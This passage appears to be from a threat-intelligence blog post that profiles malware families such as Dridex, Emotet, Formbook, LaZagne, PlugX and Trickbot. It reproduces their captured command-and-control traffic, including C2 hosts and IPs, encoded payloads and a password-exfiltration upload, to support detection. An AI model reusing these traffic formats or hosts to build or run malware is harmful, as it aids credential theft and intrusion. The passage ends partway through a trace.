+
+
+<p>DarkComet is one of the most famous RATs, developed by Jean-Pierre Lesueur in 2008. After being used in the Syrian civil war in 2011, Lesuer decided to stop developing the trojan. Indeed, DarkComet is able to enable control over a compromised system through use of a simple graphic user interface. Experts think that this user friendliness is the key of its mass success.</p>
+
+
+
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
+<pre class="wp-block-code"><code>BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
+</code></pre>
+</div></div>
+
+
+
+<h4 class="wp-block-heading">Dridex loader</h4>
+
+
+
+<p>OxCERT blog describes Dridex as &#8220;an evasive, information-stealing malware variant; its goal is to acquire as many credentials as possible and return them via an encrypted tunnel to a Command-and-Control (C&amp;C) server. These C&amp;C servers are numerous and scattered all over the Internet, if the malware cannot reach one server it will try another. For this reason, network-based measures such as blocking the C&amp;C IPs is effective only in the short-term.&#8221;<br>According to MalwareBytes, &#8220;Dridex uses an older tactic of infection by attaching a Word document that utilizes macros to install malware. However, once new versions of Microsoft Office came out and users generally updated, such a threat subsided because it was no longer simple to infect a user with this method.&#8221;<br>IBM X-Force discovered &#8220;a new version of the Dridex banking Trojan that takes advantage of a code injection technique called AtomBombing to infect systems. AtomBombing is a technique for injecting malicious code into the &#8216;atom tables&#8217; that almost all versions of Windows uses to store certain application data. It is a variation of typical code injection attacks that take advantage of input validation errors to insert and to execute malicious code in a legitimate process or application. Dridex v4 is the first malware that uses the AtomBombing process to try and infect systems.&#8221; </p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-5 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>GET /function.php?3b3988df-c05b-4fca-93cc-8f82af0e3d2b HTTP/1.1
+Host: masteronare.com
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 05 Nov 2019 20:32:12 GMT
+Content-Type: application/octet-stream
+Content-Length: 455830
+Connection: keep-alive
+Keep-Alive: timeout=60
+Accept-Ranges: bytes
+Content-Disposition: attachment; filename=5dc1dc4cd884c.pdf
+
+7Y2FGZnZ2enZ2dnZydnZ2dhgYD3Z2e1B2dnZ2dnZ2dnZmdnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnYPdnZ2dnYDUUJQA3ZDdll5flVQdWN6B19hcF9HVE51QFRaDllUWnFDfnB5X1VaAkFTdHVebWR1TlNgA1BWYANQZXIOY35wBkFtcGJCc2YHfH12dnZ2dnZ2dnZ1XxxRchx9bV5RVWRgblkFB1tafQ5DdlsAXlVjBW5ZBQd0b0FxQ3J9XlFVZn1SD1oFQ1p9DkMCR1F0VWRGblkFB1tafQJDX31eUVVmfVIAYAdcWn0OQ3ZbAFtVZGRuWQUHdG9CeUN9fV5RVWZ9UgIFB1xafQ5DYlpbXVZ0YG5ZBQd2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZicmJ2dnJAdXV2dXJRenFTdnZ2dnZ2dnZ2dnNQdnZ+X3RAcn52dnRAdkB2dlh9cn
+POST / HTTP/1.1
+Host: 194.99.22.193
+Content-Length: 3442
+Connection: Close
+Cache-Control: no-cache
+
+..5......&#91;,h?])moo..;.Y..
+v..jq..........G.0vR...@ ..6tw..&lt;.{It.y
+#l.K..8....v...v......=.+.......Q..v..P5...y...uhTqR.
+..v.QoM..o.I.l...&gt;.....p.....Rt...............</code></pre>
+
+
+
+<h4 class="wp-block-heading">Emotet</h4>
+
+
+
+<p>While Emotet historically was a banking malware organized in a botnet, nowadays Emotet is mostly seen as infrastructure as a service for content delivery. For example, since mid 2018 it is used by Trickbot for installs, which may also lead to ransomware attacks using Ryuk, a combination observed several times against high-profile targets.<br>It is always stealing information from victims but what the criminal gang behind it did, was to open up another business channel by selling their infrastructure delivering additional malicious software. From malware analysts it has been classified into epochs depending on command and control, payloads, and delivery solutions which change over time.</p>
+
+
+
+<p>The following trace is an external trace not updated to the last versions</p>
+
+
+
+<pre class="wp-block-code"><code>POST /mult/tlb/ HTTP/1.1
+Referer: http://69.162.169.173/mult/tlb/
+Content-Type: application/x-www-form-urlencoded
+DNT: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: 69.162.169.173:8080
+Content-Length: 468
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipT
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 07 Oct 2019 13:38:33 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 148
+Connection: keep-alive
+
+.^ta.I..Z .._AJ*..=._...5-...F.L{&gt;...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......&gt;D..yQ........G.q...4?..
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">Formbook</h4>
+
+
+
+<p>FormBook is yet another Stealer malware. Like most stealer malware, it performs many operations to evade AV vendors when deploying itself on a victim’s machine. And of course as we see with&nbsp;<a href="https://www.sentinelone.com/blog/ursnif-polymorphic-delivery-mechanism-explained/" target="_blank" rel="noreferrer noopener">Ursnif</a>,&nbsp;<a href="https://www.sentinelone.com/blog/hancitor-banking-trojan-back-using-malicious-word-attachment/" target="_blank" rel="noreferrer noopener">Hancitor</a>, Dridex and other trojans, there are many variants with more than one way to receive the payload.</p>
+
+
+
+<p>In the past year the&nbsp;<a rel="noreferrer noopener" href="https://www.sentinelone.com/blog/threat-actor-basics-understanding-5-main-threat-types/" target="_blank">threat actor’s</a>&nbsp;favorite method of distributing FormBook has been via malspam and the use of&nbsp;<a rel="noreferrer noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-8570" target="_blank">CVE-2017-8570</a>, using an&nbsp;<code>.RTF</code>&nbsp;file format with malicious code to exploit this vulnerability.</p>
+
+
+
+<p>Patter suggestion. Host name is almast always &#8220;www&#8221; driven 😉</p>
+
+
+
+<pre class="wp-block-code"><code>POST /k9m/ HTTP/1.1
+Host: www.liuhe127.com
+Connection: close
+Content-Length: 3769
+Cache-Control: no-cache
+Origin: http://www.liuhe127.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Referer: http://www.liuhe127.com/k9m/
+Accept-Language: en-US
+Accept-Encoding: gzip, deflate
+
+Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D2fNVsLRL8o7GMMvu8SY6wR8pwXAraJm4TKmuw5(TglqswaX2VpD_gJ3yal4FZ1pkDvEP81iuj_l_mMoqsdCGaFMxmu8LQC1CZjkxIXbFtlEaQg0Wfzvxpk9XRS39rZxxdqjALdRL8_N2LHRzPN35WuoIIn2J0mUB7u7x~42TwXHpZcLTJ4cELO23a_seXaFdgz~QWrxi7L3N9oGrwrY4tSxRUCsHQCoAB8CsxlUDIkY67TYTnYPmJxKxE06yA9NA5buPXUU-rDGiNGDQ25(b371m2NNnyheUxDNxyL6wr0syvlQ7Qn~DvzJO1j4_01FUfdeQKDmT9nuRD7AXJYaO3DIZnG1RWkvBxF0H38hB8-R7b1kP1IZqlFNLuC1ttRMUWPoRYyiYb-5rzJXywgOQncCVwVXcwH8dkVBf8nIw1doGRbV0yBZciG1vmCQMiyqspdkDVZt-1KyQhCCDaZWgyx(jUEtrJ5ZzRRfL7eaLGAG1u46ihMFAoJdDXorJcFL051WdJ2wHBfyMv2c9wu1j78lVpEWNkON2Qnw-8VOoQrg4ItHc4WjdsmkjCk(8A-d-uwY70GE0UXkWhPpg~_8qCqj_XNsXD1Cku4u0im9ibvYCLeQyYDn_FmL-U7ZNtOIbYeTHchiTz3fwdILdormZDVBuDzJlRACku5YKuqCIZoTnxUBI(iGkeX0da3GEkWCi8MA6nuA390kyWjwjSpzGHFYPG0B41C5bU5KrJx(9qiFYNfQPZqv5KDyJL8tN7jrqIny7WzTVRqvRHCeerIFPL5vosxC_3QvH2AlElM8Ssx(QZqz22ySsvMzyq8Hv~3tMLtg8mgzByn2dH2WrNAM3nk~XXu(6GurJtah4M9tPmohFGPLZxX5e3WCJ~h16eNNM4OaV~MOGVYusVrPgqFUS6P7iizTBZS(MsulNfuAKYvUq2kUMtCYSZAt34TUY6bJ5BTPy~4ydE8n16XohSRP8VbqhLAZ4DGO2n-hfrK2o9oUsNUWcpZyKA2(9kXBftM3s5lzWT21wBKbcPaiPURUuV4eheOkTBTxTB_mMxCafVVE6yvbJD-XIpSazCu(sS7~QUEbh6EPrqsB11rhKlRPy39G2rLo6lSMHeGjCmI5Rc80lhtZyFKcqhNYbhwuiEn3uK9CodgYxVie6yY1MwI(M8VSBZ-zQjldjXnFN~7oKDW3JglzgbK3lzeDK5aRb0HTwohxi8M9lRkTKflhtcr77iOlBVcE6HYSbchngmsBWBgPwA75xvzJhUUtgjJlxLW~bSPMG7x7GLVfCZjxxrjki0R9ZPDVdx71eP4yoIdymwRgqddVSuGCAIf641vyoItI9QzfvvuZBdpRQi3ZEw7LUifYAyjYZ2Xd9KdOMiNiLLeLsDCgWib~5r8iSfExWtFjsEgOt(2W_0JQSAgplkqJxkO9YxSdB9xsPfeavxYirf7azw7UGnDTEMQUnMMECFM5_v29oh6tKvIolHPv_qZrW0nGwd0aCMfzUqcV0(NlfiEQOxVZTonlWkJoR3hyyZQ~dKGW9j_WbA-8s54GvC-VC~skS2jG4haG9bxKA6QZqRK4-2qI5o2U3rNoeQEz_~yMfZ2fQoftvSkgpJfcgjuh3qTOFK8b6OSe5wMnyLdniF_4xN3rO(73lGUB5l60LbBa4TAYc(Qn7pyfvhlhMx8nr0vm6kCom1xi-VN1M(fSDqNubOVR_8QORONDFaX41G3HYOrWQyQ5Cvd6lAFgWycF3KeaumEH0LEUP7vR3t8CqgQ5VqyDxtKNy0Z7MVbqsq6s8~aYdnUL5DxSG9pbe8LW4uDqLcBuZ2WiDWmdiRx0cbf9-s0qx6mSwAo(Wz67SmWp2X8VI3W4h3M3vf9BggKJQmHp7nLChKFWJWTuEGt43fxqjimz5WaRYtGOcdlH84XYvX9kEB1C4(Fp99P6VKHhrkuCOrtiirAvl7KvjXYhsiOn20cjKKUL6l8(aZofg6g(CqTpB5dDGN86Korg1L6advz28Cc9QidH5ZPIAHrWXi9nG5FtnBxG-3R2N(J6V~IGsC8NZIwv0qB~35YLhS9SlyD38(p(pgy9N3fPHO9Gzlzd6D3j74fN-N89jhcQTClusyQIhdjrYsqWnpi7Of2Hl9zRx(ut-kFP33A5zYLbDn54f9gg8kH1m(BeKfVXxVtpGLR4VQSBfZzVwPGnUei9aJDZkXwmg0xftRV~S3TxUucpU1d75Pa9NCvgMU51f7uv0XtF1S-0_nqUy(apdab1FJcSzLOVDXJDyOKr5P4px5QpKM1FZgH9mgQQZuo~rlcBi4jISUNx3qv7fwaBZ4KDYuICC1-KLeFh0i7YEU_njjPm31uzkYLlVxfbhAg6C7Fxcpr5_jzhW~me85m48ifV4C06qNAN5WgIGxJW07CUNAuLx2d4tZI85EWgoxQa3AOuINyalNllQZt2LBB~ReVqa8Gr3pLpZOSiDREVqDaruTFqNwAZndKWZ~CTIV4ss6txpH7ypXw3AZ4fiDn5j7NDtaJzXbptIpWgrv9yK(zab71BYxnEuPpsdZSnA2QWY9s300CraaT3RPj(gdt~5OjaG22qma1M9LYzgvBdIBH57aizchPopkjnWiJAuvabKSvJyEtKb5Ni67H1WbOnOKM8pMcqsaIBi1AfQV0PbikKmG-HikPS86JBnJXZs8BWrbgm7g8uGrVpnnuHbHuP4p4xAOgYNPDbnpSoXn0kH~vUc1JxLurnAnNWMmYgA5g3fIw7HGvJSnKn6DDHod7HUKWF3ggfFJdZbucZxbJ2fpE64O6nKFy9It-R0BRZqcunVVvWy4zwCQ_1brWO78sSQY3WY4Es8kI6nl5hc9k3dhAWgQJWeqVrUGnOyxnf3wP9Tjc3fbhhfMthKeTVJEn485mDsUhxaOlIUrAoNDk1Kmua8F3zzcHpo~ixmjApivEsgkkIIni~mHnw4sce0IaJmWT9Ka_FCRQTC3dNAkBJHjcfTsYpgDvJBeZI8V7tnXTcJwQShoQoTdzOUvebgdia2s6HyC8Ay3lybE0Kvi4Ufu2qeJDnpSdiZAi8Ba-AzxnhL~66T~sQU0SY1ZDTJsdMD9zA8h5A0g71lMEIFSEdczwnvBeXpuEiaX9FOoJQwoIyyq4KmaeML~f5ipBL5MgqKf36tQ4N9jiM0IMAZdarP~ZkdSRs6dnJ7bU4FFMvQUrM0EGSJMQfLAvB7d_c0IwGUl44oifYX7n8cNJQcRPEFt1PZYPKE47I_JQ2CSVE9Scfi6hmF2mrjjozj0NQFcK5B~W~c3GpQxJ8e9cNoWhrkZNK1CyKcuTjHkfWA5Bzoi5p5mrTFsA12M25Ubt5SuEd-grtNyFbdev6Uyoislno4UJ9J6-8ag6iZXJd_QI17cAFS4P71bi7ApOh50qN4cNMIQBUTQyriS5BG~os6RMAuoaSUq92eNx12764W~RIGssW6ItGJFcg09D9nPLTs9jUhkhVwPicIhcak5ZLrkASapi44847mp8bI7hAIINPrZaKEyXejiDm5OUm7UVGno15_(251Jq3-Aic6sgovlTvlWBTFSkikUCmSMDX96nLlTuNiC2BD42WLJfGoZQw4T341YKl3rFShZ24mtmUGThc4k-k1OxGK1ygo5wLOg_H_Bs9MfxPn3aoIQiBq(XC7l4Xzw2LREItIvFPQXoWU(dxz3g)..
+</code></pre>
+
+
+
+<h4 class="wp-block-heading">IcedID</h4>
+</div>
+</div>
+
+
+
+<p>According to&nbsp;<a href="https://www.ibm.com/security/xforce/">X-Force research</a>, the new banking Trojan emerged in the wild in September 2017, when its first test campaigns were launched. Researchers noted that IcedID has a modular malicious code with modern banking Trojan capabilities comparable to malware such as the Zeus Trojan. At this time, the malware targets banks, payment card providers, mobile services providers, payroll, webmail and e-commerce sites (external take)</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-6 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>GET /photo.png?id=0181B9BACBCF3080870000000000FF40000001 HTTP/1.1
+Connection: Keep-Alive
+Host: eurobable.com
+
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 16 Oct 2019 15:30:33 GMT
+Content-Type: application/octet-stream
+Content-Length: 605211
+Connection: keep-alive
+Last-Modified: Tue, 08 Oct 2019 11:43:19 GMT
+ETag: "5d9c7657-93c1b"
+Accept-Ranges: bytes
+
+.PNG
+.
+...
+IHDR..............N.T....sRGB.........gAMA......a....	pHYs..........o.d.	;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E
+.~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.</code></pre>
+
+
+
+<h4 class="wp-block-heading">LaZagne</h4>
+
+
+
+<p>The author described LaZagne as an open source project used to retrieve lots of passwords stored on a local computer. It has been developed for the purpose of finding these passwords for the most commonly-used software. It is written in Python and provided as compiled standalone binaries for Linux, Mac, and Windows.</p>
+
+
+
+<pre class="wp-block-code"><code>POST /te.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------58748130728276
+User-Agent: Mozilla/5.0 Gecko/20100115 Firefox/3.6
+Host: 192.168.1.44
+Content-Length: 1526
+Cache-Control: no-cache
+
+-----------------------------58748130728276
+Content-Disposition: form-data; name="userfile"; filename="admin-MM-PC-passwords.txt"
+Content-Type:application/x-gzip
+
+
+########## User: admin ##########
+
+------------------- Firefox passwords -----------------
+
+&#91;+] Password found !!!
+URL: https://m.facebook.com
+Login: test@test.com
+Password: testpassword
+
+------------------- Outlook passwords -----------------
+
+&#91;-] Password not found !!!
+Account Name: test@test.com.
+POP3 User: test@test.com.
+POP3 Server: 192.168.1.1.
+u'Delivery Store EntryID: \x00\x00\ua138\u10bb\ue505\u1a10\ubba1\x08\u2a2b\uc256\x00\u736d\u7370\u2e74\u6c64l\x00\x00\u494e\u4154\ubff9\u01b8\uaa00\u3700\u6ed9\x00\x00C:\\Users\\admin\\Documents\\Outlook Files\\test@test.com.pst\x00'
+SMTP Secure Connection: 0
+SMTP Server: 192.168.1.1.
+Mini UID: 224868084
+'Delivery Folder EntryID: \x00\x00\x00\x00\x81 \xa1\x9f\x92\x06&gt;N\x9c\xc7t\xd9H\xba&gt;f\x82\x80\x00\x00'
+u'clsid: \u457b\u3444\u3537\u3134\u2d31\u3042\u3644\u312d\u4431\u2d32\u4338\u4233\u302d\u3130\u3430\u3242\u3641\u3736\u7d36'
+Display Name: test Mail.
+POP3 Password: testpassword.
+Email: test@test.com.
+u'Leave on Server: \u3139\u3537\u3730'
+
+------------------- Google chrome passwords -----------------
+
+&#91;+] Password found !!!
+URL: 
+Login: test@test.com
+Password: testpassword
+
+
+&#91;+] 3 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 2.4423969775
+
+-----------------------------58748130728276--
+
+HTTP/1.1 200 OK
+Date: Tue, 15 Sept 2019 12:08:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 1
+Content-Type: text/html; charset=UTF-8</code></pre>
+
+
+
+<h4 class="wp-block-heading">NetWire</h4>
+</div>
+</div>
+
+
+
+<p>Netwire is a RAT, its functionality seems focused on password stealing and keylogging, but includes remote control capabilities as well. Keylog files are stored on the infected machine in an obfuscated form. Nice to spot in &#8220;41 00 00 00 99&#8221; pattern on initial packet.</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-7 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>00000000  41 00 00 00 99 80 3a e0 e8 5f d7 ea 8c af 76 cc   A.....:. ._....v.
+00000010  c4 cc ad 5a 10 72 cc d0 5e 64 d8 50 80 fc b6 e6   ...Z.r.. ^d.P....
+00000020  54 25 bf e0 ea 7f 7b e4 ff 54 70 e8 eb c0 fa 80   T%....{. .Tp.....
+00000030  a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5   ........ .1|?....
+00000040  ce c4 11 97 d9                                     .....</code></pre>
+</div>
+</div>
+
+
+
+<h4 class="wp-block-heading">Ostap</h4>
+
+
+
+<p>Ostap is a commodity JScript downloader first seen in campaigns in 2016. It has been observed being delivered in ACE archives and VBA macro-enabled Microsoft Office documents. Recent versions of Ostap query WMI to check for a blacklist of running processes. </p>
+
+
+
+<p>Following a network trace externally found</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-8 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>POST /angola/mabutu.php?pi=29h&amp;tan=cezar&amp;z=662343339&amp;n=0&amp;u=20&amp;an=9468863238 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: text/plain; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+Content-Length: 1034
+Host: 185.180.199.91
+
+Microsoft Windows 7 Professional 6.1.7601*Locale:0409
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sent64.jse
+USER-PC*DELL*DELL*0
+
+System Idle Process*null
+System*null
+smss.exe*null
+csrss.exe*null
+wininit.exe*null
+csrss.exe*null
+winlogon.exe*null
+services.exe*null
+lsass.exe*null
+lsm.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+spoolsv.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+dwm.exe*C:\Windows\system32\Dwm.exe
+explorer.exe*C:\Windows\Explorer.EXE
+taskhost.exe*C:\Windows\system32\taskhost.exe
+SearchIndexer.exe*null
+qemu-ga.exe*null
+audiodg.exe*null
+WmiPrvSE.exe*null
+SearchProtocolHost.exe*null
+windanr.exe*C:\Windows\system32\windanr.exe
+OSPPSVC.EXE*null
+wscript.exe*C:\Windows\system32\wscript.exe
+wscript.exe*C:\Windows\system32\wscript.exe
+SearchFilterHost.exe*null
+WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
+WmiPrvSE.exe*null</code></pre>
+
+
+
+<h4 class="wp-block-heading">PlugX</h4>
+
+
+
+<p>RSA describes PlugX as a RAT (Remote Access Trojan) malware family that is around since 2008 and is used as a backdoor to control the victim&#8217;s machine fully. Once the device is infected, an attacker can remotely execute several kinds of commands on the affected system.</p>
+
+
+
+<pre class="wp-block-code"><code>POST /update?wd=b0b9d49c HTTP/1.1
+Accept: */*
+x-debug: 0
+x-request: 0
+x-content: 61456
+x-storage: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;
+Host: 192.168.1.44:8080
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+
+............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com.................?JJIOHDOBJEIEIBJJELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..A.........	:...Q.............?PEOJNOOBAAHDMKNGELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..2.........	:...Q.............?DBCGBLOBDMGFEIEMELEADFCKBPAEPIONNCMHLMKBJGILHAGFFKEPDECJBOADPHO?MNBMGLLKAJFIKIPHEGJFOEDDICNBCAHPLOANFMKLPKEJJIOHDGIFNECDHCMBBAG.PKOPNEMJMOLDKIJNIC.bca.udnudfer.com................=.a.gtld-servers.net..nstld.verisign-grs..]..2.........	:...Q.
+
+
+GET /EF003AAB6425775CD949B40C HTTP/1.1
+Accept: */*
+Cookie: QhTbeUW+YzYYsZWz0PQvBvYIgo8=
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; SLCC2;)
+Host: WOUDERFULU.impresstravel.ga
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+HTTP/1.1 203 
+Server: nginx
+Date: Tue, 02 October 2019 17:32:40 GMT
+Content-Type: text/html;charset=UTF-8
+Content-Length: 660
+Connection: keep-alive
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+X-Server: ip-172-31-28-245
+Set-Cookie: JSESSIONID=4618E9008B004BEE8FE5C81AB063A332; Path=/; HttpOnly</code></pre>
+
+
+
+<h4 class="wp-block-heading">Quasar</h4>
+</div>
+</div>
+
+
+
+<p>Quasar RAT is a malware family written in .NET which is used by a variety of attackers. The malware is fully functional and open source, and is often packed to make analysis of the source more difficult. Interesting pattern  flag on &#8220;40 00 00 00&#8221;, 68 data bytes on first packet. (external source)</p>
+
+
+
+<div class="wp-block-columns is-layout-flex wp-container-core-columns-layout-9 wp-block-columns-is-layout-flex">
+<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:100%">
+<pre class="wp-block-code"><code>00000000  40 00 00 00 3e 83 58 08 ad d1 05 8d 77 20 53 1f   @...&gt;.X. ....w S.
+00000010  dc 2e e8 99 0a f3 f1 bb 3a 8c c2 a1 9d 72 4a 69   ........ :....rJi
+00000020  e6 60 97 da 1e 76 87 16 91 f2 1b c4 f4 89 f9 8a   .`...v.. ........
+00000030  20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20    &#91;..|... .Z.._.. 
+00000040  c6 b3 03 8c   </code></pre>
+
+
+
+<h4 class="wp-block-heading">SmokeLoader</h4>
+
+
+
+<p>The SmokeLoader family is a generic backdoor with a range of capabilities which depend on the modules included in any given build of the malware. The malware is delivered in a variety of ways and is broadly associated with criminal activity. The malware frequently tries to hide its C2 activity by generating requests to legitimate sites such as microsoft.com, bing.com, adobe.com, and others. Typically the actual Download returns an HTTP 404 but still contains data in the Response Body. The following net trace is an external take</p>
+
+
+
+<pre class="wp-block-code"><code>POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Referer: http://thankg1.org/
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+Content-Length: 299
+Host: thankg1.org
+
+..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&amp;....."5..V.~...#.,w......\N.V`.gI..0&amp;.
+.N.Z...%.b.....V..3H....t..6w.....7.0..
+..+.........O..`...4..A..wT.F...XM&amp;2.^.Y................E.4	W`.......(.....&lt;,.zK..&gt;c..^...p......n.z"]....\S,&#91;.
+......qV4`..Pu*...8W.........M .h.v.S.:.</code></pre>
+
+
+
+<h4 class="wp-block-heading">Trickbot</h4>
+
+
+
+<p>A financial Trojan believed to be a derivative of Dyre: the bot uses very similar code, web injects, and operational tactics. Has multiple modules including VNC and Socks5 Proxy. Uses SSL for C2 communication.The following trace is an external take.</p>
+
+
+
+<pre class="wp-block-code"><code>GET https://190.154.203.218:449/<strong>trg448</strong>/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/5/spk/
+      &lt;&lt; 200 OK 224b
+GET http://54.225.92.64/
+      &lt;&lt; 200 OK 12b
+GET https://190.154.203.218:449/<strong>trg448</strong>/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/0/Windows%207%20x64%20SP1/1075/167.88.7.134/77CAB0693C33C9DA65ECB06B990E1B2A0B60E199332E20B769B1041E6155930A/7FPzmRZqhwAAJvgTcFSqNLk/
+      &lt;&lt; 200 OK 937b
+GET https://190.154.203.218:449/<strong>trg448</strong>/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/user/SYSTEM/0/
+      &lt;&lt; 200 OK
